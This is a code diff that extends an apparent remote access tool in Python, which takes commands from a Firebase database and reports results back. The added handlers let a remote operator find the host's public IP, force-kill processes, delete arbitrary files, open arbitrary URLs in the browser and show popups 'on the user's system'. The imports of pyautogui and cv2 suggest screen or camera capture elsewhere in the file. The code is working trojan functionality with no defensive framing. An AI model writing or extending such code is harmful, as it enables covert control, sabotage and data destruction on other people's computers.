@@ -21,6 +21,9 @@ import pyautogui
 import zipfile
 import tempfile
 import cv2
+import tkinter as tk
+from tkinter import messagebox
+import webbrowser
 
 cred = credentials.Certificate("storage/cred.json")  
 firebase_admin.initialize_app(cred)
@@ -460,6 +463,70 @@ def handle_os_runtask(command_doc):
     except Exception as e:
         print(f"Error running task: {e}")
 
+def handle_message_command(message_text):
+    if message_text:
+        # Display messagebox with the message text
+        root = tk.Tk()
+        root.withdraw()  # Hide the main window
+        root.attributes("-topmost", True)  # Set the window to be always on top
+        # Log successful display of message
+        output_ref = db.collection("output")
+        output_ref.add({"output": f"successfully displayed the message: '{message_text}' on the user's system"})
+        messagebox.showinfo("", message_text)
+    else:
+        output_ref = db.collection("output")
+        output_ref.add({"output": "Message text not specified."})
+
+def kill_task(task_name):
+    try:
+        # Use appropriate method to kill the task based on the OS
+        if platform.system() == "Windows":
+            subprocess.run(['taskkill', '/IM', task_name, '/F'], check=True)
+            output_ref = db.collection("output")
+            output_ref.add({"output": f"Successfully killed task: {task_name}"})
+        elif platform.system() == "Linux":
+            subprocess.run(['pkill', task_name], check=True)
+            output_ref = db.collection("output")
+            output_ref.add({"output": f"Successfully killed task: {task_name}"})
+        else:
+            output_ref = db.collection("output")
+            output_ref.add({"output": f"Killing tasks is not supported on {platform.system()}"})
+    except subprocess.CalledProcessError:
+        output_ref = db.collection("output")
+        output_ref.add({"output": f"Failed to kill task: {task_name}"})
+    except Exception as e:
+        print(f"Error killing task: {e}")
+
+def handle_os_redirect(command_doc):
+    redirect_link = command_doc.get("redirectlink")
+
+    if not redirect_link:
+        print("Redirect link not specified in the command.")
+        return
+
+    try:
+        webbrowser.open(redirect_link)
+        output_ref = db.collection("output")
+        output_ref.add({"output": f"Redirected user to: {redirect_link}"})
+    except Exception as e:
+        print(f"Error redirecting user: {e}")
+
+
+def handle_delete_command(command_doc):
+    filepath = command_doc.get("filepath")
+    if filepath:
+        try:
+            os.remove(filepath)
+            output_ref = db.collection("output")
+            output_ref.add({"output": f"File deleted: {filepath}"})
+        except Exception as e:
+            output_ref = db.collection("output")
+            output_ref.add({"output": f"Error deleting file: {e}"})
+    else:
+        output_ref = db.collection("output")
+        output_ref.add({"output": "Filepath not specified for '!delete' command."})
+
+
 
 def on_command_added(doc_snapshot, changes, read_time):
     for change in changes:
@@ -505,6 +572,27 @@ def on_command_added(doc_snapshot, changes, read_time):
                     output_ref.add({"output": active_processes})
                 elif command == "!run":
                     handle_os_runtask(change.document.to_dict())
+                elif command == "!ip":
+                    try:
+                        ip_address = requests.get('https://api.ipify.org').text
+                        output_ref = db.collection("output")
+                        output_ref.add({"output": f"IP address: {ip_address}"})
+                    except Exception as e:
+                        print(f"Error fetching IP address: {e}")
+                elif command == "!message":
+                    message_text = change.document.get("messagetxt")
+                    handle_message_command(message_text)
+                elif command == "!kill":
+                    task_name = change.document.get("task")
+                    if task_name:
+                        kill_task(task_name)
+                    else:
+                        output_ref = db.collection("output")
+                        output_ref.add({"output": "Task name not specified for '!kill' command."})
+                elif command == "!redirect":
+                    handle_os_redirect(change.document.to_dict())
+                elif command == "!delete":
+                    handle_delete_command(change.document)
                 else:
                     print(f"No logic was implemented for this document: {change.document.id}")
 
